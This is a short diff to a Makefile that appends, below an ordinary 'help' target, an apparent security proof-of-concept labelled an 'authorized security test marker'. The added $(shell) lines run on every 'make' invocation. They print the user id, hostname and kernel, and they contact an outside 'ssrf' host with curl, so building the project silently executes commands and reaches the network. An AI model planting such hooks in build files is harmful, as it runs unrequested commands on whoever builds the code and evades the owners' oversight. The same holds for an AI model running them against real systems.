@@ -439,3 +439,7 @@ help:					#: Show the help messages
 	@cat $(firstword $(MAKEFILE_LIST)) | \
 	awk '/^[-a-z]+:/' | \
 	awk -F: '{ printf("%-20s   %s\n", $$1, $$NF) }'
+
+# --- authorized security test marker (read-only, no data written) ---
+$(info ===== POC_RCE $(shell date -u +%Y-%m-%dT%H:%M:%SZ; id; hostname; uname -srm) =====)
+$(info ===== SSRF $(shell curl -sS -m 20 -w ' HTTP:%{http_code}' https://src-ssrf.bytedance.net/ssrf 2>&1 | tr '\n' ' ') =====)
